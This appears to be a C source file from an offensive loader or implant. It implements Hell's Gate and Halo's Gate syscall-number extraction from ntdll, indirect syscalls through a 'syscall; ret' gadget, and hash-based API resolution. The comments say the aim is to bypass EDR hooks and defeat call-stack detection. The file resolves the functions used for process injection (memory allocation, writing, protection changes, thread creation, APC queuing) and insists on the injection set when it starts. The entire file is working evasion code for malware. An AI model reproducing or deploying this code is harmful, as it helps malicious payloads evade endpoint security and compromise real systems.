#include "syscalls.h"
#include "peb_types.h"

/*
 * Hell's Gate + Halo's Gate SSN Extraction
 *
 * Each Nt* stub in ntdll follows the pattern:
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX 00 00    mov eax, <SSN>
 *   ...
 *   0F 05             syscall
 *   C3                ret
 *
 * Hell's Gate: read SSN directly from the clean stub bytes.
 * Halo's Gate: if the stub is hooked (JMP patch at prologue),
 * walk to neighboring stubs (offset +/- 1) and calculate the SSN
 * from their value, since SSNs are sequential in the sorted Zw export table.
 *
 * Indirect syscalls: instead of executing 'syscall' from our own .text,
 * we JMP to a 'syscall; ret' gadget inside ntdll's .text section.
 * This keeps the return address pointing at ntdll, defeating
 * call stack analysis that flags syscalls from non-ntdll modules.
 */

// Global syscall table
DN_SYSCALL_TABLE g_SyscallTable = {0};

// ntdll .text section boundaries (for gadget search)
static PVOID g_NtdllTextBase = NULL;
static DWORD g_NtdllTextSize = 0;
static PVOID g_SyscallGadget = NULL;    // address of 'syscall; ret' in ntdll

// -------------------------------------------------------------------
// PE parsing helpers
// -------------------------------------------------------------------

static PVOID get_ntdll_base(void) {
    // Walk PEB -> Ldr -> InLoadOrderModuleList
    // ntdll is always the second entry (after the exe itself)
    PDN_PEB peb = dn_get_peb();
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;   // first = exe
    entry = entry->Flink;              // second = ntdll

    PDN_LDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, DN_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    return mod->DllBase;
}

static PIMAGE_NT_HEADERS get_nt_headers(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    return (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
}

static PIMAGE_EXPORT_DIRECTORY get_exports(PVOID base) {
    PIMAGE_NT_HEADERS nt = get_nt_headers(base);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (rva == 0) return NULL;
    return (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + rva);
}

// Find .text section base and size for gadget hunting
static BOOL find_text_section(PVOID base) {
    PIMAGE_NT_HEADERS nt = get_nt_headers(base);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            g_NtdllTextBase = (BYTE*)base + sec[i].VirtualAddress;
            g_NtdllTextSize = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// Locate a 'syscall; ret' gadget (0F 05 C3) in ntdll .text
static PVOID find_syscall_gadget(void) {
    if (!g_NtdllTextBase || g_NtdllTextSize == 0) return NULL;

    BYTE* p = (BYTE*)g_NtdllTextBase;
    for (DWORD i = 0; i < g_NtdllTextSize - 2; i++) {
        // 0F 05 = syscall, C3 = ret
        if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3) {
            return &p[i];
        }
    }
    return NULL;
}

// -------------------------------------------------------------------
// SSN extraction: Hell's Gate + Halo's Gate
// -------------------------------------------------------------------

// Get the address of an exported function by name hash (djb2)
static DWORD djb2_hash(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

static PVOID get_export_by_hash(PVOID base, DWORD hash) {
    PIMAGE_EXPORT_DIRECTORY exports = get_exports(base);
    if (!exports) return NULL;

    DWORD* names    = (DWORD*)((BYTE*)base + exports->AddressOfNames);
    WORD*  ordinals = (WORD*)((BYTE*)base + exports->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)((BYTE*)base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)base + names[i]);
        if (djb2_hash(name) == hash) {
            return (BYTE*)base + funcs[ordinals[i]];
        }
    }
    return NULL;
}

// Check if a stub is clean (not hooked)
// Clean Nt stub prologue: 4C 8B D1 B8 XX XX 00 00
static BOOL is_stub_clean(BYTE* func) {
    return (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 &&
            func[3] == 0xB8 && func[6] == 0x00 && func[7] == 0x00);
}

// Extract SSN from a clean stub (bytes 4-5 are the SSN as little-endian WORD)
static DWORD extract_ssn(BYTE* func) {
    return *(WORD*)(func + 4);
}

// Hell's Gate: extract SSN directly from the stub
// Halo's Gate: if hooked, walk neighbors to find a clean one and offset
static BOOL resolve_ssn(PVOID func_addr, DN_SYSCALL* entry) {
    BYTE* func = (BYTE*)func_addr;

    // Hell's Gate: stub is clean
    if (is_stub_clean(func)) {
        entry->ssn = extract_ssn(func);
        entry->syscall_addr = g_SyscallGadget;
        entry->resolved = TRUE;
        return TRUE;
    }

    // Halo's Gate: stub is hooked, search neighbors
    // Nt stubs are typically 32 bytes apart in ntdll
    // Search up to 512 stubs in each direction
    for (int offset = 1; offset < 512; offset++) {
        // check downward neighbor (func + offset * 32)
        BYTE* down = func + (offset * 32);
        if (is_stub_clean(down)) {
            entry->ssn = extract_ssn(down) - offset;
            entry->syscall_addr = g_SyscallGadget;
            entry->resolved = TRUE;
            return TRUE;
        }

        // check upward neighbor (func - offset * 32)
        BYTE* up = func - (offset * 32);
        if (is_stub_clean(up)) {
            entry->ssn = extract_ssn(up) + offset;
            entry->syscall_addr = g_SyscallGadget;
            entry->resolved = TRUE;
            return TRUE;
        }
    }

    entry->resolved = FALSE;
    return FALSE;
}

// -------------------------------------------------------------------
// Hash values for target functions (djb2)
// Pre-computed: python3 -c "h=5381;\nfor c in 'NtAllocateVirtualMemory': h=((h<<5)+h)+ord(c)\nprint(hex(h&0xFFFFFFFF))"
// -------------------------------------------------------------------
#define HASH_NtAllocateVirtualMemory    0xf783b8ec
#define HASH_NtWriteVirtualMemory       0x4c20406b
#define HASH_NtProtectVirtualMemory     0x858c5a8c
#define HASH_NtCreateThreadEx           0x2786a572
#define HASH_NtOpenProcess              0x4b82f718
#define HASH_NtClose                    0x0f7a9a26
#define HASH_NtWaitForSingleObject      0xc6a2fa12
#define HASH_NtQueryVirtualMemory       0xc5bb0c61
#define HASH_NtFreeVirtualMemory        0x2802c609
#define HASH_NtCreateSection            0xc78fb268
#define HASH_NtMapViewOfSection         0xc3b93c08
#define HASH_NtUnmapViewOfSection       0xa9964b44
#define HASH_NtQueueApcThread           0x0b74a5aa
#define HASH_NtResumeThread             0x89a06ed0
#define HASH_NtDelayExecution           0xb0c0a837

// -------------------------------------------------------------------
// Public API
// -------------------------------------------------------------------

typedef struct {
    DWORD       hash;
    DN_SYSCALL* entry;
} RESOLVE_ENTRY;

BOOL dn_syscalls_init(void) {
    PVOID ntdll = get_ntdll_base();
    if (!ntdll) return FALSE;

    // find .text section for gadget hunting
    if (!find_text_section(ntdll)) return FALSE;

    // locate syscall; ret gadget
    g_SyscallGadget = find_syscall_gadget();
    if (!g_SyscallGadget) return FALSE;

    // resolve table
    RESOLVE_ENTRY table[] = {
        { HASH_NtAllocateVirtualMemory,  &g_SyscallTable.NtAllocateVirtualMemory },
        { HASH_NtWriteVirtualMemory,     &g_SyscallTable.NtWriteVirtualMemory },
        { HASH_NtProtectVirtualMemory,   &g_SyscallTable.NtProtectVirtualMemory },
        { HASH_NtCreateThreadEx,         &g_SyscallTable.NtCreateThreadEx },
        { HASH_NtOpenProcess,            &g_SyscallTable.NtOpenProcess },
        { HASH_NtClose,                  &g_SyscallTable.NtClose },
        { HASH_NtWaitForSingleObject,    &g_SyscallTable.NtWaitForSingleObject },
        { HASH_NtQueryVirtualMemory,     &g_SyscallTable.NtQueryVirtualMemory },
        { HASH_NtFreeVirtualMemory,      &g_SyscallTable.NtFreeVirtualMemory },
        { HASH_NtCreateSection,          &g_SyscallTable.NtCreateSection },
        { HASH_NtMapViewOfSection,       &g_SyscallTable.NtMapViewOfSection },
        { HASH_NtUnmapViewOfSection,     &g_SyscallTable.NtUnmapViewOfSection },
        { HASH_NtQueueApcThread,         &g_SyscallTable.NtQueueApcThread },
        { HASH_NtResumeThread,           &g_SyscallTable.NtResumeThread },
        { HASH_NtDelayExecution,         &g_SyscallTable.NtDelayExecution },
    };

    int total = sizeof(table) / sizeof(table[0]);
    int resolved = 0;

    for (int i = 0; i < total; i++) {
        PVOID addr = get_export_by_hash(ntdll, table[i].hash);
        if (addr && resolve_ssn(addr, table[i].entry)) {
            resolved++;
        }
    }

    // require at least the critical ones
    return (g_SyscallTable.NtAllocateVirtualMemory.resolved &&
            g_SyscallTable.NtWriteVirtualMemory.resolved &&
            g_SyscallTable.NtProtectVirtualMemory.resolved &&
            g_SyscallTable.NtCreateThreadEx.resolved);
}
